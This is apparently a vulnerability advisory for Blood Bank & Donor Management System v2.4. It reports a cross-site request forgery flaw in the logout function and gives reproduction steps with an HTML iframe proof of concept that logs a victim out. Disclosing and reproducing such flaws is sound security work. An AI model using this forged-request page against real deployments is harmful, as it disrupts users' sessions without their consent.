## Description:
Blood Bank & Donor Management System v2.4 suffers from a Cross-Site Request
Forgery (CSRF) vulnerability due to the absence of CSRF tokens for critical
functionalities such as logout. An attacker can craft a malicious iframe
embedding the logout URL and trick a victim into clicking it. This results
in the victim being logged out without their consent.

## Steps to Reproduce:
1. Deploy Blood Bank & Donor Management System v2.4.
2. Log in as any user.
3. Use the following PoC to demonstrate the issue:

   ```html
   <html>
     <body>
       <iframe
         src="http://localhost/bbdms/logout.php"
         style="border:0px #FFFFFF none;"
         name="myLogoutFrame"
         scrolling="no"
         frameborder="1"
         marginheight="0px"
         marginwidth="0px"
         height="400px"
         width="600px"
         allowfullscreen>
       </iframe>
     </body>
   </html>
4. Save the above HTML code as logout_poc.html.
5.Open the file in a browser and click anywhere on the page to trigger the
logout.
